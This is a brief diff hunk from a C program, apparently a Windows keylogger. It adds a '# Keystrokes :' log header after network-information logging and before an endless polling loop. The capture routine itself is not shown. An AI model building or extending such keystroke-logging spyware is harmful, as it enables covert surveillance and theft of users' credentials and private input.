@@ -72,7 +72,8 @@ int main( int argc, char *argv[ ] )
 	// Log informations about the network
 	log_network_infos( log_file );
 
-	
+	// Log the keystrokes
+	log_infos( log_file, "# Keystrokes :\n" );
 	for( ; ; )
 	{
 		Sleep( 40 );
